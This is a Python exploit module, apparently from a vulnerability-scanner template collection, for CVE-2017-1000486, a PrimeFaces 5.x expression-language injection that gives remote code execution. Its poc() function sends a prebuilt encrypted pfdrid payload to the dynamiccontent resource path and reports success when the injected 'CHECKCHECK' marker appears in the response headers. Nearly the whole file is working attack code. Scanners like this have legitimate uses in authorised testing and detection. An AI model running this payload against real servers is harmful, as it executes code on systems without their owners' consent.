import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Primetek Primefaces 5.x EL Injection - RCE''',
        "description": '''Primetek Primefaces 5.x is vulnerable to a weak encryption flaw resulting in remote code execution''',
        "severity": "critical",
        "references": [
            "https://github.com/mogwailabs/CVE-2017-1000486", 
            "https://github.com/pimps/CVE-2017-1000486", 
            "https://blog.mindedsecurity.com/2016/02/rce-in-oracle-netbeans-opensource.html", 
            "https://nvd.nist.gov/vuln/detail/CVE-2017-1000486"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cvss-score": "",
            "cve-id": "CVE-2017-1000486",
            "cwe-id": "CWE-326"
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["cve", "cve2017", "primetek", "rce", "injection"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/javax.faces.resource/dynamiccontent.properties.xhtml"""
        method = "POST"
        data = """pfdrt=sc&ln=primefaces&pfdrid=uMKljPgnOTVxmOB%2BH6%2FQEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVbBkVHj5xLXXCaFGpOHe704aOkNwaB12Cc3Iq6NmBo%2BQZuqhqtPxdTA%3D%3D"""
        headers = {'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded', 'Accept-Encoding': 'gzip, deflate'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if ("""CHECKCHECK""" in str(resp0.headers)):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url